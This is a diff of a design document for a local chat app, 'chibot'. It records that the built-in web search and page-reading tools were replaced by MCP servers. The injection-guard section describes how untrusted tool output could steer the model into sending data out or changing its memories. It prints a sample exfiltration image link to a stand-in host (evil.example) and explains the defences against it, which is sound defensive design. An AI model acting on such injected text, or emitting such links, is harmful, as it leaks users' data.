@@ -390,6 +390,12 @@ message and Settings switches turn tools off; no streamed partial images; an
 `edit_image` tool for follow-ups; image quality fixed at `medium`; generated
 images join JSON exports in Phase 9.
 
+> **Since then:** `web_search` and `fetch_url` no longer ship. Web search and
+> reading pages come from MCP servers (Settings → Tools), so chibot keeps no
+> Brave key, address guard or page extraction of its own for them; the notes
+> below record how they worked, and old chats that used them still show their
+> sources. What replaced the protections is in §5's injection guard.
+
 Findings: Brave returns title, URL, description (with `<strong>` tags), age
 and extra snippets per result. `net.BlockList` flags loopback, private, CGNAT,
 link-local/metadata and IPv6 ULA/link-local addresses, IPv4-mapped IPv6
@@ -479,16 +485,17 @@ The sidebar search (every word must match) doesn't suit model queries.
   entirely (no tool, no memories in the instructions). Settings →
   Personalization shows the same switch in a Memory section, with Manage
   memories: the count against the limit, and edit or delete.
-- **Injection guard.** `web_search`, `fetch_url` and `search_chats` (old chats
-  hold whatever was pasted in them) get `untrustedOutput`;
+- **Injection guard.** `search_chats` (old chats hold whatever was pasted in
+  them) and every MCP tool's output get `untrustedOutput` (so did the removed
+  `web_search` and `fetch_url`);
   `memory` gets `requiresApproval: 'after-untrusted'`: once a chat's history
   holds untrusted output, memory changes there wait for Approve / Deny. The
   whole chat counts, since that text stays in the context for later turns.
   Text from others can also steer the model to send data out. Two channels
-  are closed: `fetch_url` is `'after-untrusted'` too, but a call the model
-  can't have made up runs (`Tool.askAfterUntrusted`: an address the user wrote
-  or a web search returned, exactly; anything added to one, such as
-  `?d=<data>`, asks), and the app's pages carry
+  were closed: a page reader that asked before opening an address nobody gave
+  (`fetch_url`, now removed; an MCP server's tools ask only if that server is set
+  to **Ask before using its tools**, so switch it on for one that reads pages or
+  searches), and the app's pages carry
   `Content-Security-Policy: img-src 'self' data: blob:` while the Markdown
   renderer shows an image from another site as a link, because a browser that
   loads `![](https://evil.example/c?d=…)` has sent the data without a click.
@@ -879,7 +886,6 @@ Environment variables:
 | `OPENAI_TRANSCRIBE_MODEL` | `gpt-transcribe` on OpenAI | Voice input transcription (Phase 9); the starting value of Settings → Other models |
 | `OPENAI_IMAGE_MODEL` | `gpt-image-2` on OpenAI | Image generation tool (Phase 6); the starting value of Settings → Other models |
 | `OPENAI_EMBEDDING_MODEL` | `text-embedding-3-small` on OpenAI | Project file embeddings (Phase 8); the starting value of Settings → Other models |
-| `BRAVE_API_KEY` | — (optional) | Enables the web search tool (Phase 6) |
 | `HOST` | `127.0.0.1` | Interface to listen on; `0.0.0.0` exposes it on the LAN, so set `CHIBOT_TOKEN` too |
 | `PORT` | `3000` | API server port |
 | `CHIBOT_TOKEN` | — | Requires a token, remembered per browser in a cookie (v0.10.2) |
@@ -906,10 +912,12 @@ Environment variables:
   That's acceptable for a local app; code-split if it starts to matter.
 - **Future tools:** a code runner comes with Phase 11. Deliberately out:
   shell/filesystem tools (too costly when mis-approved on an unauthenticated
-  server) and narrow APIs like weather, which web search plus `fetch_url`
-  cover.
-- **Citations from our own web search** depend on the model following the
+  server) and narrow APIs like weather, which a web search MCP server plus a
+  page-reading one cover.
+- **Citations from web search** depend on the model following the
   instructions, since there are no hosted `url_citation` annotations. The UI's
-  sources list comes from the tool result, so sources are always shown.
+  sources list comes from the tool result, which it understands only for chibot's
+  own tools and chats made with the removed `web_search` and `fetch_url`: an MCP
+  search server's results show as that tool's text, without a Sources list.
 - **`node:sqlite` stability:** it's built into Node 26. If its API shifts,
   `database.ts` and the stores are the places to change.
